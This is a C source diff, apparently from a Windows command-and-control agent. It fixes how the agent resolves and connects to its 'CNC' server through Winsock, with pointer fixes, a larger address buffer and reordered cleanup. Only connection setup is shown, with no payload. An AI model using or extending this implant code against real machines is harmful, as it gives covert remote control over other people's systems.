@@ -24,21 +24,23 @@ void init_winsock()
     log_debug("Initialized Winsock.");
 }
 
-void get_cnc_addrinfo(char *host, struct addrinfo *result)
+void get_cnc_addrinfo(char *host, struct addrinfo **result)
 {
     int ret;
-    struct addrinfo hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
-    char cnc_addr[32];
+    char cnc_addr[255];
     long unsigned int cnc_addr_len = sizeof(cnc_addr);
+    struct addrinfo *cnc_addrinfo, hints = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
 
-    ret = getaddrinfo(host, CNC_PORT, &hints, &result);
+    ret = getaddrinfo(host, CNC_PORT, &hints, result);
     if (ret)
     {
         log_error("getaddrinfo failed: %d\n", ret);
         WSACleanup();
         exit(EXIT_FAILURE);
     }
-    ret = WSAAddressToStringA(result->ai_addr, result->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
+
+    cnc_addrinfo = *result;
+    ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
     if (ret)
     {
         log_error("WSAAddressToStringA failed: %d\n", ret);
@@ -48,14 +50,13 @@ void get_cnc_addrinfo(char *host, struct addrinfo *result)
     log_debug("CNC's address: %s", cnc_addr);
 }
 
-void init_cnc_sock(struct addrinfo *cnc_addrinfo)
+void init_cnc_sock()
 {
-    cnc_sock = socket(cnc_addrinfo->ai_family, cnc_addrinfo->ai_socktype, cnc_addrinfo->ai_protocol);
+    cnc_sock = socket(AF_INET, SOCK_STREAM, 0);
 
     if (cnc_sock == INVALID_SOCKET)
     {
         log_error("Error at socket(): %ld\n", WSAGetLastError());
-        freeaddrinfo(cnc_addrinfo);
         WSACleanup();
         exit(EXIT_FAILURE);
     }
@@ -64,12 +65,22 @@ void init_cnc_sock(struct addrinfo *cnc_addrinfo)
 void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 {
     int ret;
+    char cnc_addr[255];
+    long unsigned int cnc_addr_len = sizeof(cnc_addr);
+
+    ret = WSAAddressToStringA(cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen, NULL, cnc_addr, &cnc_addr_len);
+    if (ret)
+    {
+        log_error("WSAAddressToStringA failed: %d\n", ret);
+        WSACleanup();
+        exit(EXIT_FAILURE);
+    }
 
     ret = connect(cnc_sock, cnc_addrinfo->ai_addr, cnc_addrinfo->ai_addrlen);
     if (ret == SOCKET_ERROR)
     {
-        closesocket(cnc_sock);
         log_error("Error at connect(): %ld\n", WSAGetLastError());
+        closesocket(cnc_sock);
         WSACleanup();
         exit(EXIT_FAILURE);
     }
@@ -77,10 +88,10 @@ void connect_to_cnc(struct addrinfo *cnc_addrinfo)
 
 int start_agent(char *host)
 {
-    struct addrinfo cnc_addrinfo = {.ai_family = AF_INET, .ai_socktype = SOCK_STREAM, .ai_protocol = IPPROTO_TCP};
+    struct addrinfo *cnc_addrinfo;
 
     init_winsock();
     get_cnc_addrinfo(host, &cnc_addrinfo);
-    init_cnc_sock(&cnc_addrinfo);
-    connect_to_cnc(&cnc_addrinfo);
+    init_cnc_sock();
+    connect_to_cnc(cnc_addrinfo);
 }
